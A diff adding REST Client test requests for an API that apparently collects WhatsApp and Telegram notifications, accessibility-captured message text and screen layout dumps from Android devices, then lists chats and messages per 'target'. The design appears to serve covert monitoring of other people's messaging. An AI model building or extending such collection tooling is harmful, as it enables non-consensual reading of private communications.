@@ -1,0 +1,158 @@
+###
+# UnifiedNotification API test requests
+# Run from VS Code REST Client (or compatible .http runner)
+
+@baseUrl = https://adequate-mustang-usefully.ngrok-free.app
+@email = admin@example.com
+@password = ChangeMe123!
+@accessToken = REPLACE_WITH_ACCESS_TOKEN
+@refreshToken = REPLACE_WITH_REFRESH_TOKEN
+@userId = REPLACE_WITH_USER_ID
+@targetId = REPLACE_WITH_TARGET_ID
+@deviceId = emulator-5554
+@nowMs = 1712145600000
+
+### Health-ish check via open ingest endpoint (no auth)
+POST {{baseUrl}}/notification
+Content-Type: application/json
+x-device-id: {{deviceId}}
+
+{
+  "type": "status",
+  "source": "manual-test",
+  "packageName": "com.whatsapp",
+  "appName": "WhatsApp",
+  "title": "Ping",
+  "message": "API alive check",
+  "timestamp": {{nowMs}}
+}
+
+### Login
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "email": "{{email}}",
+  "password": "{{password}}"
+}
+
+### Refresh access token
+POST {{baseUrl}}/api/auth/refresh
+Content-Type: application/json
+
+{
+  "refreshToken": "{{refreshToken}}"
+}
+
+### Ingest accessibility event (open)
+POST {{baseUrl}}/accessibility
+Content-Type: application/json
+x-device-id: {{deviceId}}
+
+{
+  "type": "accessibility",
+  "source": "manual-test",
+  "packageName": "com.telegram.messenger",
+  "appName": "Telegram",
+  "chatTitle": "QA Group",
+  "eventType": "TYPE_WINDOW_CONTENT_CHANGED",
+  "direction": "incoming",
+  "text": "Hello from .http",
+  "className": "android.widget.TextView",
+  "timestamp": {{nowMs}}
+}
+
+### Ingest layout dump (open)
+POST {{baseUrl}}/layout-dump
+Content-Type: application/json
+x-device-id: {{deviceId}}
+
+{
+  "type": "layout_dump",
+  "packageName": "com.whatsapp",
+  "appName": "WhatsApp",
+  "timestamp": {{nowMs}},
+  "nodes": [
+    {
+      "depth": 0,
+      "id": "root",
+      "class": "android.widget.FrameLayout",
+      "bounds": "[0,0][1080,2400]"
+    },
+    {
+      "depth": 1,
+      "text": "Send",
+      "hint": "Type a message",
+      "class": "android.widget.EditText"
+    }
+  ]
+}
+
+### Ingest unknown payload (open wildcard route)
+POST {{baseUrl}}/call
+Content-Type: application/json
+x-device-id: {{deviceId}}
+
+{
+  "foo": "bar",
+  "timestamp": {{nowMs}},
+  "meta": {
+    "source": "manual-test"
+  }
+}
+
+### List targets (auth required)
+GET {{baseUrl}}/api/targets
+Authorization: Bearer {{accessToken}}
+
+### List apps (auth required)
+GET {{baseUrl}}/api/apps
+Authorization: Bearer {{accessToken}}
+
+### List chats (auth required)
+GET {{baseUrl}}/api/chats?page=1&pageSize=20&targetId={{targetId}}&packageName=com.whatsapp
+Authorization: Bearer {{accessToken}}
+
+### List messages (auth required)
+GET {{baseUrl}}/api/messages?page=1&pageSize=20&targetId={{targetId}}&packageName=com.whatsapp&direction=incoming&from=1712140000000&to=1712150000000
+Authorization: Bearer {{accessToken}}
+
+### List notifications (auth required)
+GET {{baseUrl}}/api/notifications?page=1&pageSize=20&targetId={{targetId}}&packageName=com.whatsapp&from=1712140000000&to=1712150000000
+Authorization: Bearer {{accessToken}}
+
+### Target summary (auth required)
+GET {{baseUrl}}/api/targets/{{targetId}}/summary
+Authorization: Bearer {{accessToken}}
+
+### Admin: create user (SUPERADMIN only)
+POST {{baseUrl}}/api/admin/users
+Authorization: Bearer {{accessToken}}
+Content-Type: application/json
+
+{
+  "email": "new.user@example.com",
+  "password": "ChangeMe123!",
+  "name": "New User",
+  "role": "USER"
+}
+
+### Admin: link target to user (SUPERADMIN only)
+POST {{baseUrl}}/api/admin/targets/link
+Authorization: Bearer {{accessToken}}
+Content-Type: application/json
+
+{
+  "userId": "{{userId}}",
+  "targetId": "{{targetId}}"
+}
+
+### Admin: unlink target from user (SUPERADMIN only)
+DELETE {{baseUrl}}/api/admin/targets/link
+Authorization: Bearer {{accessToken}}
+Content-Type: application/json
+
+{
+  "userId": "{{userId}}",
+  "targetId": "{{targetId}}"
+}
